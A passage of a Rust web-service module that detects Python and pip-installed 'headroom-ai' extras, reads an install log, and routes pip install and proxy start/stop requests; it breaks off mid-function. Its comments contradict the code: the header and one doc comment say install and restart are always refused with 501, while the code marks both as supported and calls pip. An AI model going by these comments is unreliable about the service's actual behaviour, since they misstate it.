//! Headroom: detection is real, process control is refused.
//!
//! Upstream's dashboard drives an external Python subsystem (`headroom-ai`). It
//! installs compression extras with `pip`, and spawns and kills a detached proxy
//! daemon it tracks through a pid file. This port draws a line through the
//! middle of that surface, and the line is deliberate:
//!
//! * **Detection runs for real.** Finding a Python >= 3.10, asking it which
//!   packages it holds, and reading the install log are read-only probes.
//!   Answering them from a fixture would tell a user compression is available
//!   when it is not, or the reverse.
//! * **Install and restart are refused explicitly.** `POST
//!   /api/headroom/extras` and `POST /api/headroom/restart` answer `501` with
//!   `unsupported: true` and a `code`, because this service does not own the
//!   Python environment it discovers and has no supervisor for a detached
//!   daemon. A fabricated `{"success":true}` would be the worst lie available in
//!   this file: the user would believe their prompts were being compressed and
//!   would be billed for full-size requests instead.
//!
//! Every probe that runs a process builds an argument vector — never a shell
//! string — and runs on the blocking pool, never on an Actix worker.

use std::{
    collections::{BTreeMap, HashSet},
    path::{Path, PathBuf},
    process::{Child, Command, ExitStatus, Stdio},
    time::{Duration, Instant},
};

mod control;

use actix_web::{HttpResponse, http::StatusCode, web};
use serde::{Deserialize, Serialize};
use serde_json::Value;

use crate::{json_body, responses};

/// URL reported by `status`, unchanged from before this module grew.
const HEADROOM_URL: &str = "http://127.0.0.1:8787";

/// Extras that improve compression quality, mirroring upstream's
/// `HEADROOM_COMPRESSION_EXTRAS`. `proxy` is the base and is not listed here.
const HEADROOM_COMPRESSION_EXTRAS: [&str; 2] = ["code", "ml"];

/// Marker packages each extra pulls in, as `pip list` names them.
///
/// Presence of any marker is what "this extra is installed" means: pip records
/// no extra set on the installed distribution, so the dependency is the only
/// observable evidence.
const EXTRA_MARKERS: [(&str, &[&str]); 2] = [
    ("code", &["tree-sitter", "tree-sitter-language-pack"]),
    ("ml", &["torch", "huggingface-hub"]),
];

/// The distribution the extras attach to.
const HEADROOM_DIST: &str = "headroom-ai";

/// `headroom-ai` requires this or newer.
const MIN_PYTHON: (u32, u32) = (3, 10);

/// Names the interpreter to use, overriding the search.
///
/// The way out of a PEP 668 refusal: a virtualenv named here can be installed into, where the
/// distribution's own Python cannot.
const PYTHON_OVERRIDE_VAR: &str = "NULLROUTER_PYTHON";
const MIN_PYTHON_LABEL: &str = "3.10";

/// Budgets for the two kinds of probe. `pip` reads its own metadata tree, so it
/// gets the larger one; upstream uses the same 8s for it.
const PIP_TIMEOUT: Duration = Duration::from_secs(8);
const VERSION_TIMEOUT: Duration = Duration::from_secs(4);
/// How often a running probe is checked for exit.
const POLL_INTERVAL: Duration = Duration::from_millis(20);

/// Interpreter names to probe, most specific first.
const PYTHON_NAMES: [&str; 6] = [
    "python3.13",
    "python3.12",
    "python3.11",
    "python3.10",
    "python3",
    "python",
];

/// Tail length for the install log, matching upstream's `getInstallLogTail`.
const INSTALL_LOG_TAIL_LINES: usize = 15;

/// Upstream's `DEFAULT_HEADROOM_URL`, overridable by the same env var it reads.
const DEFAULT_HEADROOM_URL: &str = "http://localhost:8787";
const DEFAULT_HEADROOM_PORT: u16 = 8787;

/// Hosts upstream's `isLoopbackHeadroomUrl` accepts.
///
/// `0.0.0.0` is in the set because upstream puts it there. It is not a loopback
/// address — it means "every interface" — so this is parity with a slightly
/// wrong upstream check, not an endorsement. It only decides which refusal a
/// caller gets here (`400 EXTERNAL_PROXY` versus `501`), because this port never
/// starts a proxy either way.
const LOOPBACK_HOSTS: [&str; 5] = ["localhost", "127.0.0.1", "::1", "[::1]", "0.0.0.0"];

// ── process probes ──────────────────────────────────────────────────────────

/// Run `program` with `args` and return its stdout, or `None`.
///
/// `None` covers every way a probe can fail to produce an answer — the program
/// is absent, it exited non-zero, it outran `timeout`, or its output was not
/// UTF-8. A probe that cannot answer must not be reported as a negative answer,
/// so callers propagate the `None` instead of substituting `false`.
///
/// stdout is drained by a helper thread while this thread owns the child and
/// polls it. Both halves are required: without the drain a chatty program
/// deadlocks once it fills the pipe buffer (`pip list` on a large environment
/// clears 64KB easily), and without owning the child there is nothing left to
/// kill when the deadline passes.
///
/// The drain hands its buffer back over a channel rather than through
/// `JoinHandle::join`, because `join` has no timeout: a grandchild that inherited
/// the pipe can hold it open after the child this function spawned has exited,
/// and joining on that would park a blocking-pool thread indefinitely. With a
/// channel the wait is bounded, and the orphaned drain thread ends by itself when
/// the last writer closes.
///
/// The argument vector is passed straight to `exec`. No shell is involved, so no
/// caller value can become a command.
fn probe(program: &Path, args: &[&str], timeout: Duration) -> Option<String> {
    let mut child = Command::new(program)
        .args(args)
        .stdin(Stdio::null())
        .stdout(Stdio::piped())
        .stderr(Stdio::null())
        .spawn()
        .ok()?;

    let stdout = child.stdout.take()?;
    let (sender, receiver) = std::sync::mpsc::channel();
    std::thread::spawn(move || {
        let mut buffer = Vec::new();
        let read = std::io::copy(&mut { stdout }, &mut buffer).is_ok();
        // A closed receiver means this probe already gave up; dropping the
        // buffer is then the whole job.
        let _sent = sender.send(read.then_some(buffer));
    });

    let deadline = Instant::now() + timeout;
    let status = wait_with_deadline(&mut child, deadline)?;
    let remaining = deadline.saturating_duration_since(Instant::now());
    let output = receiver.recv_timeout(remaining).ok()??;
    status
        .success()
        .then(|| String::from_utf8(output).ok())
        .flatten()
}

/// Wait for `child` until `deadline`, killing it if it runs past.
///
/// Returns `None` when the deadline passed, so a hung probe reads as "no
/// answer" rather than as a failed one.
fn wait_with_deadline(child: &mut Child, deadline: Instant) -> Option<ExitStatus> {
    loop {
        match child.try_wait() {
            Ok(Some(status)) => return Some(status),
            Ok(None) => {}
            Err(_error) => return None,
        }
        if Instant::now() >= deadline {
            // Reap after killing so no zombie is left behind.
            let _killed = child.kill();
            let _reaped = child.wait();
            return None;
        }
        std::thread::sleep(POLL_INTERVAL);
    }
}

/// Directories a Python install commonly lands in but a packaged `PATH` misses.
///
/// Upstream keeps the same list. Full paths are built from these rather than
/// editing the child's `PATH`, so a probe resolves to exactly the file named.
fn extra_bin_dirs() -> Vec<PathBuf> {
    let mut dirs: Vec<PathBuf> = Vec::new();
    if cfg!(windows) {
        for var in ["LOCALAPPDATA", "APPDATA"] {
            if let Some(root) = std::env::var_os(var) {
                for version in ["Python313", "Python312", "Python311", "Python310"] {
                    dirs.push(
                        Path::new(&root)
                            .join("Programs\\Python")
                            .join(version)
                            .join("Scripts"),
                    );
                }
            }
        }
    } else {
        dirs.push(PathBuf::from("/usr/local/bin"));
        dirs.push(PathBuf::from("/opt/homebrew/bin"));
        for minor in ["3.13", "3.12", "3.11", "3.10"] {
            dirs.push(
                Path::new("/Library/Frameworks/Python.framework/Versions")
                    .join(minor)
                    .join("bin"),
            );
        }
        if let Some(home) = std::env::var_os("HOME") {
            dirs.push(Path::new(&home).join(".local").join("bin"));
        }
        dirs.push(PathBuf::from("/usr/bin"));
        dirs.push(PathBuf::from("/bin"));
    }
    dirs
}

/// Add the platform's executable suffix to a bare interpreter name.
fn executable_name(name: &str) -> String {
    if cfg!(windows) {
        format!("{name}.exe")
    } else {
        name.to_owned()
    }
}

/// The `headroom` CLI, if it is on `PATH`.
///
/// `PATH` is scanned here instead of shelling out to `which`/`where`: one fewer
/// process, and no shell to quote for.
fn find_headroom_binary() -> Option<PathBuf> {
    let name = executable_name("headroom");
    std::env::var_os("PATH")
        .map(|path| std::env::split_paths(&path).collect::<Vec<_>>())
        .unwrap_or_default()
        .into_iter()
        .chain(extra_bin_dirs())
        .map(|dir| dir.join(&name))
        .find(|candidate| candidate.is_file())
}

/// Interpreters to probe, most specific first.
///
/// The interpreter beside the `headroom` binary comes first because it is the
/// one that necessarily holds `headroom-ai`; then full paths under
/// [`extra_bin_dirs`]; then bare names for `PATH` to resolve. Absolute paths are
/// de-duplicated by canonical target, so a directory full of symlinks to one
/// interpreter is probed once.
fn python_candidates() -> Vec<PathBuf> {
    let mut candidates: Vec<PathBuf> = Vec::new();
    let mut seen: HashSet<PathBuf> = HashSet::new();

    let mut push = |candidate: PathBuf, dedupe: bool| {
        if dedupe {
            if !candidate.is_file() {
                return;
            }
            let key = candidate
                .canonicalize()
                .unwrap_or_else(|_| candidate.clone());
            if !seen.insert(key) {
                return;
            }
        }
        candidates.push(candidate);
    };

    // An explicit choice wins, and is the answer to a PEP 668 interpreter: point this at a
    // virtualenv and installing works without fighting the system package manager. It is still
    // version-checked and permission-checked like any other candidate.
    if let Some(configured) = std::env::var_os(PYTHON_OVERRIDE_VAR) {
        let path = PathBuf::from(configured);
        if !path.as_os_str().is_empty() {
            push(path, false);
        }
    }

    if let Some(dir) = find_headroom_binary().as_deref().and_then(Path::parent) {
        for name in ["python3", "python3.13", "python"] {
            push(dir.join(executable_name(name)), true);
        }
    }
    for dir in extra_bin_dirs() {
        for name in PYTHON_NAMES {
            push(dir.join(executable_name(name)), true);
        }
    }
    // Bare names cannot be de-duplicated without resolving `PATH` ourselves;
    // they are the fallback for a layout the lists above do not cover.
    for name in PYTHON_NAMES {
        push(PathBuf::from(name), false);
    }
    candidates
}

/// `(major, minor)` reported by `program --version`, if it answered.
fn python_version(program: &Path) -> Option<(u32, u32)> {
    probe(program, &["--version"], VERSION_TIMEOUT).and_then(|out| parse_python_version(&out))
}

/// Pull `3.12` out of `Python 3.12.4`.
///
/// Written without a regex, and without slicing by index, so no input can panic
/// it. Anything that is not `<digits>.<digits>` is `None`.
fn parse_python_version(output: &str) -> Option<(u32, u32)> {
    let digits_at = output.find(|ch: char| ch.is_ascii_digit())?;
    let (_prefix, rest) = output.split_at_checked(digits_at)?;
    let (major, rest) = leading_number(rest)?;
    let minor_text = rest.strip_prefix('.')?;
    let (minor, _rest) = leading_number(minor_text)?;
    Some((major, minor))
}

/// Parse the leading run of digits, returning it and the remainder.
fn leading_number(text: &str) -> Option<(u32, &str)> {
    let end = text
        .find(|ch: char| !ch.is_ascii_digit())
        .unwrap_or(text.len());
    let (digits, rest) = text.split_at_checked(end)?;
    digits.parse().ok().map(|value| (value, rest))
}

/// Whether `version` satisfies [`MIN_PYTHON`].
const fn version_is_supported(version: (u32, u32)) -> bool {
    version.0 > MIN_PYTHON.0 || (version.0 == MIN_PYTHON.0 && version.1 >= MIN_PYTHON.1)
}

/// Whether this interpreter can see `dist`.
fn sees_distribution(python: &Path, dist: &str) -> bool {
    probe(python, &["-m", "pip", "show", dist], PIP_TIMEOUT).is_some()
}

/// A Python >= 3.10, preferring one that already holds `headroom-ai`.
///
/// `python3` and `python3.13` can be different environments, and the extras this
/// panel reports must describe the interpreter the CLI actually runs under.
/// Falls back to the first version-eligible interpreter when no environment
/// holds the distribution yet, which is the state a first install starts from.
fn find_python_310() -> Option<PathBuf> {
    let mut fallback: Option<PathBuf> = None;
    for candidate in python_candidates() {
        let Some(version) = python_version(&candidate) else {
            continue;
        };
        if !version_is_supported(version) {
            continue;
        }
        if fallback.is_none() {
            fallback = Some(candidate.clone());
        }
        if sees_distribution(&candidate, HEADROOM_DIST) {
            return Some(candidate);
        }
    }
    fallback
}

/// One row of `pip list --format=json`.
#[derive(Debug, Deserialize)]
struct PipPackage {
    #[serde(default)]
    name: String,
    #[serde(default)]
    version: Option<String>,
}

/// Normalise a distribution name the way PEP 503 does.
///
/// `pip list` prints whatever the metadata holds, so `huggingface_hub` and
/// `huggingface-hub` are the same distribution and must compare equal.
fn normalise_dist(name: &str) -> String {
    name.trim()
        .to_ascii_lowercase()
        .replace(['_', '.'], "-")
        .split('-')
        .filter(|part| !part.is_empty())
        .collect::<Vec<_>>()
        .join("-")
}

/// What one interpreter holds: the distribution, its version, and the extras.
#[derive(Debug, Clone)]
struct ExtrasStatus {
    installed: bool,
    version: Option<String>,
    extras: BTreeMap<&'static str, bool>,
}

impl ExtrasStatus {
    /// The shape upstream returns when nothing could be determined: not
    /// installed, no version, every extra false.
    fn unknown() -> Self {
        Self {
            installed: false,
            version: None,
            extras: HEADROOM_COMPRESSION_EXTRAS
                .into_iter()
                .map(|extra| (extra, false))
                .collect(),
        }
    }
}

/// Which extras `python` holds, read from one `pip list`.
///
/// Answers both questions upstream's `getInstalledHeadroomExtras` answers — the
/// installed version, and which marker packages are present — from a single
/// call. A pip that fails or times out yields [`ExtrasStatus::unknown`], the
/// same as upstream's `catch`.
fn installed_extras(python: Option<&Path>) -> ExtrasStatus {
    let Some(python) = python else {
        return ExtrasStatus::unknown();
    };
    let Some(output) = probe(
        python,
        &[
            "-m",
            "pip",
            "list",
            "--format=json",
            "--disable-pip-version-check",
        ],
        PIP_TIMEOUT,
    ) else {
        return ExtrasStatus::unknown();
    };
    let Ok(packages) = serde_json::from_str::<Vec<PipPackage>>(&output) else {
        return ExtrasStatus::unknown();
    };

    let names: HashSet<String> = packages
        .iter()
        .map(|package| normalise_dist(&package.name))
        .collect();
    if !names.contains(&normalise_dist(HEADROOM_DIST)) {
        return ExtrasStatus::unknown();
    }

    let version = packages
        .iter()
        .find(|package| normalise_dist(&package.name) == normalise_dist(HEADROOM_DIST))
        .and_then(|package| package.version.clone())
        .filter(|version| !version.trim().is_empty());

    let extras = EXTRA_MARKERS
        .into_iter()
        .map(|(extra, markers)| {
            let present = markers
                .iter()
                .any(|marker| names.contains(&normalise_dist(marker)));
            (extra, present)
        })
        .collect();

    ExtrasStatus {
        installed: true,
        version,
        extras,
    }
}

/// The full detection pass: interpreter, its version, and what it holds.
#[derive(Debug, Clone)]
struct Detection {
    python: Option<PathBuf>,
    python_version: Option<String>,
    status: ExtrasStatus,
}

/// Probe the host. Blocking: callers run this off the Actix workers.
fn detect() -> Detection {
    let python = find_python_310();
    let python_version = python
        .as_deref()
        .and_then(python_version)
        .map(|(major, minor)| format!("{major}.{minor}"));
    let status = installed_extras(python.as_deref());
    Detection {
        python,
        python_version,
        status,
    }
}

// ── install log ─────────────────────────────────────────────────────────────

/// Data directories to look for `headroom/install.log` in, most likely first.
///
/// Same discovery `services/state-actix/src/migrate.rs` uses, and the same
/// `DATA_DIR` override upstream reads.
fn data_dirs() -> Vec<PathBuf> {
    let mut dirs = Vec::new();
    if let Ok(configured) = std::env::var("DATA_DIR")
        && !configured.trim().is_empty()
    {
        dirs.push(PathBuf::from(configured));
    }
    if let Some(home) = std::env::var_os("HOME") {
        dirs.push(Path::new(&home).join(".9router"));
    }
    if let Some(appdata) = std::env::var_os("APPDATA") {
        dirs.push(Path::new(&appdata).join("9router"));
    }
    dirs
}

/// An existing `headroom/install.log`, if one is there.
///
/// This service never writes it: installs are refused, so nothing here produces
/// a log line. What it can find is a log some *other* process left — upstream
/// 9Router running against the same data directory, or a `pip install` a user
/// redirected there. Reading it is how the panel can show that history instead
/// of an empty box it cannot explain.
fn install_log_path() -> Option<PathBuf> {
    data_dirs()
        .into_iter()
        .map(|dir| dir.join("headroom").join("install.log"))
        .find(|path| path.is_file())
}

/// The last [`INSTALL_LOG_TAIL_LINES`] non-empty lines of the install log.
///
/// An absent or unreadable file is `""`, matching upstream, because "no install
/// has been logged here" and "the log is empty" are the same thing to a reader.
fn install_log_tail() -> (String, Option<PathBuf>) {
    let Some(path) = install_log_path() else {
        return (String::new(), None);
    };
    let Ok(content) = std::fs::read_to_string(&path) else {
        return (String::new(), Some(path));
    };
    let lines: Vec<&str> = content
        .lines()
        .map(str::trim_end)
        .filter(|line| !line.is_empty())
        .collect();
    let start = lines.len().saturating_sub(INSTALL_LOG_TAIL_LINES);
    let tail = lines.into_iter().skip(start).collect::<Vec<_>>().join("\n");
    (tail, Some(path))
}

// ── headroom URL ────────────────────────────────────────────────────────────

/// Whether `--code-aware` is on.
///
/// Upstream reads `settings.headroomCodeAware === true`, so anything other than a stored `true`
/// means off. This port's settings projection carries no such field, so the env var stands in,
/// with the same default: off unless explicitly turned on.
fn configured_code_aware() -> bool {
    env_flag("HEADROOM_CODE_AWARE").unwrap_or(false)
}

/// Whether kompress is on.
///
/// Upstream reads `settings.headroomKompress !== false`, so the default is **on** and only a
/// stored `false` disables it. Getting this backwards would silently turn compression off for
/// every deployment that never set it.
fn configured_kompress() -> bool {
    env_flag("HEADROOM_KOMPRESS").unwrap_or(true)
}

/// Read a boolean environment variable, or `None` when it is unset or unreadable.
fn env_flag(name: &str) -> Option<bool> {
    let value = std::env::var(name).ok()?;
    match value.trim().to_ascii_lowercase().as_str() {
        "1" | "true" | "yes" | "on" => Some(true),
        "0" | "false" | "no" | "off" => Some(false),
        _ => None,
    }
}

/// The configured proxy URL.
///
/// Upstream reads `settings.headroomUrl` and falls back to
/// `DEFAULT_HEADROOM_URL`, which is itself `process.env.HEADROOM_URL ||
/// "http://localhost:8787"`. This port's settings projection
/// (`nullrouter-contracts`' `settings_response`) carries no `headroomUrl` field,
/// so there is no stored value to read — the env var is upstream's own override
/// for the same setting, and the default is identical.
fn configured_headroom_url() -> String {
    std::env::var("HEADROOM_URL")
        .ok()
        .map(|url| url.trim().to_owned())
        .filter(|url| !url.is_empty())
        .unwrap_or_else(|| DEFAULT_HEADROOM_URL.to_owned())
}

/// The authority of an absolute URL: everything between `://` and the path.
///
/// A URL with no scheme yields `None`, so it fails the loopback check rather
/// than being read as a bare hostname. Upstream's `new URL(...)` throws on the
/// same input and its `catch` returns `false`.
fn url_authority(url: &str) -> Option<&str> {
    let (scheme, rest) = url.split_once("://")?;
    // RFC 3986: a scheme starts with a letter and holds only letters, digits,
    // `+`, `-`, `.`. `://x` has no scheme at all, and must not parse as a host.
    let mut scheme_chars = scheme.chars();
    if !scheme_chars.next().is_some_and(char::is_alphabetic)
        || !scheme_chars.all(|ch| ch.is_ascii_alphanumeric() || matches!(ch, '+' | '-' | '.'))
    {
        return None;
    }
    let end = rest.find(['/', '?', '#']).unwrap_or(rest.len());
    rest.split_at_checked(end)
        .map(|(authority, _tail)| authority)
}

/// The host of an absolute URL, with any userinfo and port removed.
///
/// A bracketed IPv6 literal keeps its brackets, matching upstream's
/// `LOOPBACK_HOSTS` entry for `[::1]` while `URL.hostname` would strip them —
/// upstream lists both spellings, so both are accepted here too.
fn url_host(url: &str) -> Option<&str> {
    let authority = url_authority(url)?;
    let host_port = authority
        .rsplit_once('@')
        .map_or(authority, |(_userinfo, host)| host);
    if let Some(rest) = host_port.strip_prefix('[') {
        let (inside, _tail) = rest.split_once(']')?;
        return Some(inside).filter(|host| !host.is_empty());
    }
    let host = host_port
        .rsplit_once(':')
        .map_or(host_port, |(host, _port)| host);
    Some(host).filter(|host| !host.is_empty())
}

/// The explicit port of an absolute URL, when it names a usable one.
fn url_port(url: &str) -> Option<u16> {
    let authority = url_authority(url)?;
    let host_port = authority
        .rsplit_once('@')
        .map_or(authority, |(_userinfo, host)| host);
    let port_text = host_port.rsplit_once(']').map_or_else(
        || host_port.rsplit_once(':').map(|(_host, port)| port),
        |(_v6, tail)| tail.strip_prefix(':'),
    )?;
    port_text.parse::<u16>().ok().filter(|port| *port > 0)
}

/// Whether this URL points at the local machine, by upstream's definition.
///
/// See [`LOOPBACK_HOSTS`] for why `0.0.0.0` is in that set.
fn is_loopback_headroom_url(url: &str) -> bool {
    url_host(url).is_some_and(|host| {
        let host = host.trim().to_ascii_lowercase();
        LOOPBACK_HOSTS
            .iter()
            .any(|allowed| allowed.trim_matches(['[', ']']) == host || *allowed == host)
    })
}

/// The extras a `POST` body asked for, filtered to the known set.
///
/// Tolerant of shape the way upstream's `Array.isArray(body?.extras) ?
/// body.extras : []` is: a missing, null, or non-array `extras` means "none
/// requested", and non-string elements are dropped. Returns the accepted names
/// and the rejected ones, so a refusal can say which of the caller's names this
/// build recognised at all.
fn requested_extras(body: Option<&Value>) -> (Vec<String>, Vec<String>) {
    let requested: Vec<String> = body
        .and_then(|body| body.get("extras"))
        .and_then(Value::as_array)
        .map(|items| {
            items
                .iter()
                .filter_map(Value::as_str)
                .map(str::to_owned)
                .collect()
        })
        .unwrap_or_default();

    let (accepted, ignored): (Vec<String>, Vec<String>) = requested
        .into_iter()
        .partition(|extra| HEADROOM_COMPRESSION_EXTRAS.contains(&extra.as_str()));
    (accepted, ignored)
}

/// The pip requirement upstream would install for these extras.
///
/// `proxy` is always present because it is the base the proxy command lives in.
/// Built from the already-filtered list, so it is a closed set of literals.
/// The distribution names one or more extras pull in.
///
/// Read from the same marker table `installed_extras` uses to decide whether an extra is present,
/// so removing exactly reverses what installing added. A name that is not a known extra
/// contributes nothing: it was already filtered by `requested_extras`, and this is the second
/// place that would have to fail for a request name to reach `pip`.
fn marker_packages(accepted: &[String]) -> Vec<String> {
    let mut packages: Vec<String> = accepted
        .iter()
        .filter_map(|extra| {
            EXTRA_MARKERS
                .iter()
                .find(|(name, _markers)| *name == extra.as_str())
        })
        .flat_map(|(_name, markers)| markers.iter().map(|marker| (*marker).to_owned()))
        .collect();
    packages.sort_unstable();
    packages.dedup();
    packages
}

fn install_spec(accepted: &[String]) -> String {
    let mut extras: Vec<&str> = vec!["proxy"];
    extras.extend(accepted.iter().map(String::as_str));
    format!("{HEADROOM_DIST}[{}]", extras.join(","))
}

// ── response shapes ─────────────────────────────────────────────────────────

const EXTERNAL_PROXY: &str = "External Headroom proxies must be started outside 9Router";

/// What `installMessage` says now that installing works.
const INSTALL_SUPPORTED: &str = "Installing extras runs pip against the interpreter reported in `python`, with a 15 minute \
     deadline. The `ml` extra pulls large packages.";

/// What `restartMessage` says now that restarting works.
const RESTART_SUPPORTED: &str =
    "Start, stop and restart supervise the headroom proxy and report the pid this service owns.";

#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
struct HeadroomStatus {
    running: bool,
    healthy: bool,
    url: &'static str,
    /// The pid this service owns, when it owns one.
    managed_pid: Option<u32>,
    /// Supervisor state: `stopped`, `starting`, `running`, `backoff`, `failed`.
    state: &'static str,
    /// Restarts since the last manual start, so a flapping proxy is visible.
    restarts: u32,
    /// Why the last attempt ended badly.
    #[serde(skip_serializing_if = "Option::is_none")]
    last_error: Option<String>,
    message: &'static str,
}

#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
struct ProxyUnsupported {
    success: bool,
    unsupported: bool,
    path: String,
    message: &'static str,
}

/// `GET /api/headroom/extras`.
///
/// `available`, `installed`, `version`, and `extras` are upstream's shape and
/// carry upstream's meaning. The rest is additive, and exists so the panel can
/// render an honest state without a second request: which interpreter answered,
/// what this build requires, and — before any button is pressed — that install
/// and restart will be refused. A UI that has to `POST` to discover a refusal
/// shows a live-looking button that does nothing.
#[derive(Debug, Serialize)]
#[serde(rename_all = "camelCase")]
struct ExtrasReport {
    available: [&'static str; 2],
    installed: bool,
    version: Option<String>,
    extras: BTreeMap<&'static str, bool>,
    python: Option<String>,
    python_version: Option<String>,
    python_min_version: &'static str,
    install_supported: bool,
    install_message: &'static str,
    restart_supported: bool,
    restart_message: &'static str,
}

impl From<Detection> for ExtrasReport {
    fn from(detection: Detection) -> Self {
        Self {
            available: HEADROOM_COMPRESSION_EXTRAS,
            installed: detection.status.installed,
            version: detection.status.version,
            extras: detection.status.extras,
            python: detection
                .python
                .as_deref()
                .map(|path| path.display().to_string()),
            python_version: detection.python_version,
            python_min_version: MIN_PYTHON_LABEL,
            // Both are true now. Left as fields rather than removed: a panel built against the
            // earlier build branches on them, and flipping the value is what tells it the
            // buttons work.
            install_supported: true,
            install_message: INSTALL_SUPPORTED,
            restart_supported: true,
            restart_message: RESTART_SUPPORTED,
        }
    }
}

/// `GET /api/headroom/extras?log=1`.
#[derive(Debug, Serialize)]
#[serde(rename_all = "camelCase")]
struct LogTail {
    log: String,
    /// Where the tail was read from, or `null` when no log exists yet. Stated
    /// because this service never writes one, so an empty `log` needs an
    /// explanation the panel can show.
    log_path: Option<String>,
}

/// `POST /api/headroom/extras`, always a refusal in this build.
/// A finished `pip` run.
#[derive(Debug, Serialize)]
#[serde(rename_all = "camelCase")]
struct InstallResult {
    success: bool,
    /// The requirement that was installed, or the packages removed.
    spec: String,
    /// Extras this build recognises, out of what was asked for.
    requested: Vec<String>,
    /// Names that are not in [`HEADROOM_COMPRESSION_EXTRAS`].
    ignored: Vec<String>,
    available: [&'static str; 2],
    /// The tail of what `pip` printed, so the panel can show what happened.
    output: String,
    /// What is installed now, re-detected rather than assumed.
    #[serde(skip_serializing_if = "Option::is_none")]
    extras: Option<ExtrasReport>,
}

/// A `pip` run that did not succeed.
#[derive(Debug, Serialize)]
#[serde(rename_all = "camelCase")]
struct InstallFailed {
    success: bool,
    /// Machine-readable cause: `NOT_INSTALLED`, `NO_PYTHON`, `EXTERNALLY_MANAGED`, `PIP_FAILED`.
    code: &'static str,
    error: String,
    /// The requirement that was attempted, so the operator can run it themselves.
    spec: String,
    requested: Vec<String>,
    ignored: Vec<String>,
    available: [&'static str; 2],
}

/// The outcome of a start, stop or restart.
#[derive(Debug, Serialize)]
#[serde(rename_all = "camelCase")]
struct ProcessResult {
    success: bool,
    running: bool,
    /// Supervisor state, so a panel can distinguish `starting` from `running`.
    state: &'static str,
    /// The pid this service owns. Upstream reports one read back from a file, which can
    /// describe a pid the kernel has since reused.
    #[serde(skip_serializing_if = "Option::is_none")]
    pid: Option<u32>,
    url: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    port: Option<u16>,
    message: String,
    /// Recent daemon output, which is where a startup problem explains itself.
    #[serde(skip_serializing_if = "Vec::is_empty")]
    logs: Vec<String>,
}

/// A start or restart that did not succeed.
#[derive(Debug, Serialize)]
#[serde(rename_all = "camelCase")]
struct ProcessFailed {
    success: bool,
    code: &'static str,
    error: String,
    url: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    port: Option<u16>,
    state: &'static str,
    #[serde(skip_serializing_if = "Vec::is_empty")]
    logs: Vec<String>,
}

/// `POST /api/headroom/restart` for a proxy this machine does not host.
///
/// `error` and `code` are upstream's verbatim; `url` names what was judged.
#[derive(Debug, Serialize)]
#[serde(rename_all = "camelCase")]
struct ExternalProxyRefused {
    success: bool,
    error: &'static str,
    code: &'static str,
    url: String,
}

/// `?log=1` selects the install-log tail, as upstream's does.
#[derive(Debug, Deserialize)]
struct ExtrasQuery {
    #[serde(default)]
    log: Option<String>,
}

// ── routes ──────────────────────────────────────────────────────────────────

pub(super) fn configure(config: &mut web::ServiceConfig) {
    config
        .service(web::resource("/api/headroom/status").route(web::get().to(status)))
        .service(
            web::resource("/api/headroom/extras")
                .route(web::get().to(extras))
                .route(web::post().to(install_extras))
                .route(web::delete().to(uninstall_extras))
                .route(web::method(actix_web::http::Method::OPTIONS).to(no_content)),
        )
        .service(
            web::resource("/api/headroom/restart")
                .route(web::post().to(restart))
                .route(web::method(actix_web::http::Method::OPTIONS).to(no_content)),
        )
        .service(web::resource("/api/headroom/start").route(web::post().to(start)))
        .service(web::resource("/api/headroom/stop").route(web::post().to(stop)))
        .service(web::resource("/api/headroom/proxy/{tail:.*}").route(web::to(proxy)));
}

async fn no_content() -> HttpResponse {
    responses::empty(StatusCode::NO_CONTENT)
}

/// `GET /api/headroom/status`.
///
/// `running` and `managedPid` now come from the supervisor rather than being fixed. `healthy` is
/// still separate from `running`, and deliberately so: the process existing is not the same claim
/// as the proxy answering, and collapsing them would report a wedged daemon as healthy.
async fn status() -> HttpResponse {
    let snapshot = control::snapshot();
    responses::json(
        StatusCode::OK,
        &HeadroomStatus {
            running: snapshot.pid.is_some(),
            healthy: snapshot.is_running(),
            url: HEADROOM_URL,
            managed_pid: snapshot.pid,
            state: snapshot.state.as_str(),
            restarts: snapshot.restarts,
            last_error: snapshot.last_error,
            message: if snapshot.pid.is_some() {
                "headroom proxy is supervised by this service"
            } else {
                "no headroom proxy is running under this service"
            },
        },
    )
}

/// Report what the host actually holds, or the install log tail.
///
/// Both branches shell out to `python`/`pip`, which can take seconds. They run
/// on the blocking pool so an Actix worker is never parked on a subprocess. A
/// join failure is reported as a failure — never as "nothing installed", which
/// is a claim about the host this service would not have verified.
async fn extras(query: web::Query<ExtrasQuery>) -> HttpResponse {
    if query.log.as_deref() == Some("1") {
        return match actix_web::rt::task::spawn_blocking(install_log_tail).await {
            Ok((log, path)) => responses::json(
                StatusCode::OK,
                &LogTail {
                    log,
                    log_path: path.map(|path| path.display().to_string()),
                },
            ),
            Err(error) => {
                tracing::warn!(%error, "headroom install log read failed");
                responses::json(
                    StatusCode::INTERNAL_SERVER_ERROR,
                    &responses::error("Headroom install log could not be read"),
                )
            }
        };
    }

    match actix_web::rt::task::spawn_blocking(detect).await {
        Ok(detection) => responses::json(StatusCode::OK, &ExtrasReport::from(detection)),
        Err(error) => {
            tracing::warn!(%error, "headroom detection failed");
            responses::json(
                StatusCode::INTERNAL_SERVER_ERROR,
                &responses::error("Headroom detection could not be completed"),
            )
        }
    }
}

/// `POST /api/headroom/extras` — install the requested extras with `pip`.
///
/// The requirement is built by [`install_spec`] from [`HEADROOM_COMPRESSION_EXTRAS`], so the
/// request chooses *which of two known extras* to include and nothing else: names outside that
/// list are reported in `ignored` rather than passed to `pip`. Combined with the requirement
/// charset in `nullrouter-procctl`, there is no request that reaches `pip` as a flag, a URL, or a
/// second package.
///
/// `pip` gets a deadline, which upstream does not give it — the `ml` extra pulls `torch`, and a
/// stalled index otherwise leaves the install waiting indefinitely with nothing to cancel.
async fn install_extras(body: web::Bytes) -> HttpResponse {
    // A malformed body is rejected before anything else: a caller who sent
    // broken JSON must not receive a considered answer about their extras.
    let parsed = match json_body::parse_optional::<Value>(&body) {
        Ok(parsed) => parsed,
        Err(response) => return response,
    };
    let (requested, ignored) = requested_extras(parsed.as_ref());
    let spec = install_spec(&requested);

    match control::pip_install(&spec).await {
        Ok(output) => {
            // Re-detect rather than assume: `pip` can report success having resolved to an
            // already-satisfied requirement, and what the panel needs is what is now installed.
            let extras = actix_web::rt::task::spawn_blocking(detect)
                .await
                .map(ExtrasReport::from)
                .ok();
            responses::json(
                StatusCode::OK,
                &InstallResult {
                    success: true,
                    spec,
                    requested,
                    ignored,
